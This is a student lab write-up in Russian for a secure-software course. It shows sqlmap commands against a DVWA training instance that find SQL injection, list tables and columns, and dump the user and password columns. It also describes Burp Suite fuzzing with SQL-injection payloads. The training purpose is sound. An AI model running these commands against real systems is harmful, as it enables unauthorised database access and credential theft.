# Secure_software_4
Task 1, 2, 3: first_task.php, second_task.php, third_task.php + .png файлы
# Task 4: SqlMap
### Вводим команду для поиска SQL-инъекций
```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -p 'id' --dbms='mysql' --level=3
```
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/abd54d82-83d7-476f-bd7c-03b33e578e8d)

### Таблицы в базе данных dvwa
```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -D dvwa --tables
```
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/a2b72c1f-8ed7-4770-8984-d200e21e313b)

### Поля таблицы users
```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -D dvwa -T users –column
```
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/fad2c3cf-b383-44c1-86db-96e76ac4df95)

### Cодержимое таблицы через флаг dump
```
sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=h7b79417e8om8h6ppsj109t0pl; security=low' -D dvwa -T users -C user,password --dump
```
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/9543ab9c-5c18-4507-b8d8-a74952e9207a)
# Task 5: Burp
### Откроем Burp Suite. Необходимо настроить прокси в браузере через Burp
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/0af76902-84a4-4fb1-b953-7251cc7dc038)
### После входа на сайт можно переходить в Burp во вкладку proxy
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/0aa12ab4-37c3-4861-886e-63a5dc804a01)
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/3e8b1d93-d226-40c2-b865-f019b48ec1ee)
### Заменяем вставляемое значение на значение популярных SQL-инъекций. Результатом будет список отправленный инъекций на сервер
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/41c494fb-b09e-4176-b3fc-9a3c653bb106)
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/2b4e5a1d-933b-48c8-92ae-472f233a3ee7)
### Попрбуем использовать ниъекцию с самой большой длиной
![image](https://github.com/keenetic29/Secure_software_4/assets/122115141/b27f1564-71cc-4425-9801-bf7bbbba1453)

